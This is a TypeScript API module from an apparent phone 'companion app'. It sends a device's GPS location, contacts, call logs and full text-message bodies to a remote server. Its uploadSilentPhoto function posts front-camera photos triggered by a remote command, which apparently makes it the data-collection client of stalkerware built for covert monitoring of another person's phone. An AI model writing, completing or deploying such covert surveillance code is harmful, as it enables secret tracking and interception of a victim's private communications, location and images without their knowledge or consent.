// companion-app/src/services/api.ts
import { API_BASE_URL } from "../config";

export interface HeartbeatPayload {
  device_id?: string;
  pairing_code?: string;
  battery_level?: number;
  is_charging?: boolean;
  model?: string;
  os_version?: string;
}

export interface LocationPayload {
  device_id: string;
  latitude: number;
  longitude: number;
  accuracy?: number;
  speed?: number;
  altitude?: number;
  battery_level?: number;
}

export interface BatchDataPayload {
  device_id: string;
  contacts?: Array<{ name: string; phone_numbers: string[]; emails?: string[] }>;
  calls?: Array<{ contact_name?: string; phone_number: string; call_type: string; duration_seconds: number; timestamp: string }>;
  messages?: Array<{ sender: string; recipient?: string; body: string; message_type: string; timestamp: string }>;
}

export async function sendHeartbeat(payload: HeartbeatPayload) {
  const res = await fetch(`${API_BASE_URL}/api/device-sync/heartbeat`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  return res.json();
}

export async function sendLocation(payload: LocationPayload) {
  const res = await fetch(`${API_BASE_URL}/api/device-sync/location`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  return res.json();
}

export async function sendBatchData(payload: BatchDataPayload) {
  const res = await fetch(`${API_BASE_URL}/api/device-sync/data`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
  return res.json();
}

export async function uploadSilentPhoto(deviceId: string, photoUri: string, commandId?: string, cameraType = "front") {
  const formData = new FormData();
  formData.append("device_id", deviceId);
  if (commandId) formData.append("command_id", commandId);
  formData.append("camera_type", cameraType);

  const filename = photoUri.split("/").pop() || "photo.jpg";
  formData.append("photo", {
    uri: photoUri,
    name: filename,
    type: "image/jpeg",
  } as any);

  const res = await fetch(`${API_BASE_URL}/api/device-sync/upload-photo`, {
    method: "POST",
    body: formData,
  });
  return res.json();
}
